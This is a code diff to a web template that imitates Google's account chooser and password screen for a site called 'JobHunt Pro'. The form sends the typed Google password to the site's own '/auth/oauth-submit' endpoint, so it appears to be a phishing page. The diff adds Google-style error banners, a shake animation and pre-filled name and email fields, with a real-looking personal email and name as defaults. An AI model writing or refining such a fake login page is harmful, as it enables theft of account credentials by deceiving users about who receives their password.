@@ -193,11 +193,29 @@
       color: #ffffff;
       font-size: 16px;
       outline: none;
-      transition: border-color 0.2s;
+      transition: border-color 0.2s, box-shadow 0.2s;
     }
     .password-input:focus {
       border-color: #8ab4f8;
       box-shadow: 0 0 0 1px #8ab4f8;
+    }
+    .password-input.input-error {
+      border-color: #f28b82 !important;
+      box-shadow: 0 0 0 1px #f28b82 !important;
+    }
+    .error-banner {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #f28b82;
+      font-size: 13px;
+      margin-top: 8px;
+      animation: shake 0.3s ease-in-out;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-4px); }
+      75% { transform: translateX(4px); }
     }
     .toggle-pwd-btn {
       position: absolute;
@@ -278,7 +296,7 @@
     </svg>
 
     <!-- STEP 1: Account Chooser List -->
-    <div id="stepAccountList">
+    <div id="stepAccountList" style="{{ 'display:none;' if error or show_password_step else 'display:block;' }}">
       <h1 class="google-title">Choose an account</h1>
       <p class="google-subtitle">to continue to JobHunt Pro</p>
 
@@ -392,28 +410,36 @@
     </div>
 
     <!-- STEP 2: Password Screen -->
-    <div id="stepPassword" class="step-password">
+    <div id="stepPassword" class="step-password" style="{{ 'display:block;' if error or show_password_step else 'display:none;' }}">
       <h1 class="google-title">Welcome</h1>
       
       <div class="user-pill-container">
         <div class="user-pill" onclick="showAccountList()" title="Click to choose another account">
           <div id="pillAvatar" class="pill-avatar avatar-sam">S</div>
-          <span id="pillEmail">samatou683@gmail.com</span>
+          <span id="pillEmail">{{ selected_email or default_email or 'samatou683@gmail.com' }}</span>
           <span style="font-size:12px; opacity:0.7;">▼</span>
         </div>
       </div>
 
       <form id="googleLoginForm" action="/auth/oauth-submit" method="POST">
         <input type="hidden" id="formProvider" name="provider" value="google">
-        <input type="hidden" id="formName" name="name" value="">
-        <input type="hidden" id="formEmail" name="email" value="">
+        <input type="hidden" id="formName" name="name" value="{{ selected_name or default_name or 'Sam Salameh' }}">
+        <input type="hidden" id="formEmail" name="email" value="{{ selected_email or default_email or 'samatou683@gmail.com' }}">
 
         <div class="form-group">
           <label class="input-label" for="pwdField">Enter your password</label>
           <div class="password-wrapper">
-            <input type="password" id="pwdField" name="password" class="password-input" placeholder="Password" required autofocus>
+            <input type="password" id="pwdField" name="password" class="password-input {{ 'input-error' if error else '' }}" placeholder="Password" required autofocus>
             <button type="button" class="toggle-pwd-btn" onclick="togglePasswordVisibility()" aria-label="Show password">👁</button>
           </div>
+          {% if error %}
+          <div class="error-banner">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+            </svg>
+            <span>{{ error }}</span>
+          </div>
+          {% endif %}
         </div>
 
         <div class="actions-row">
@@ -434,14 +460,17 @@
       document.getElementById('pillEmail').innerText = email;
       
       const avatarEl = document.getElementById('pillAvatar');
-      avatarEl.className = 'pill-avatar ' + avatarClass;
-      avatarEl.innerText = initial;
+      avatarEl.className = 'pill-avatar ' + (avatarClass || 'avatar-sam');
+      avatarEl.innerText = initial || email.charAt(0).toUpperCase();
 
       document.getElementById('stepAccountList').style.display = 'none';
       document.getElementById('stepPassword').style.display = 'block';
       
       const pwdInput = document.getElementById('pwdField');
       pwdInput.value = '';
+      pwdInput.classList.remove('input-error');
+      const errBanner = document.querySelector('.error-banner');
+      if (errBanner) errBanner.style.display = 'none';
       setTimeout(() => pwdInput.focus(), 100);
     }
 
